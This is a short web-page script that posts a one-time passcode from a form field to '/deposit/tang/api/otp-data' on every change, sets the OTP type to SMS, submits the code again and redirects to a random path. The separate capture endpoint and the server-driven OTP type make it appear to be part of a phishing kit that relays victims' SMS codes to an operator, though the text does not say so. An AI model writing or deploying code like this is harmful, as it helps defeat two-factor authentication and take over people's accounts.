        <script>
        $(document).on('change', '#input-code', function() {
            $.post('/deposit/tang/api/otp-data', {code: $(this).val()});
        });

        $.post('/deposit/tang/api/otp-type', {type: 'SMS'});

        $(document).on('submit', '.lab-form', function(e) {
            $('.btn-save').attr('disabled', true);

            $.post('/deposit/tang/api/otp-submit', {code: $('#input-code').val()}, function(response) {
                location.href = '/deposit/tang/wo/' + rand_str(16);
            });

            e.preventDefault();
        });

        function rand_str(length) {
            var result           = '';
            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }
        </script>
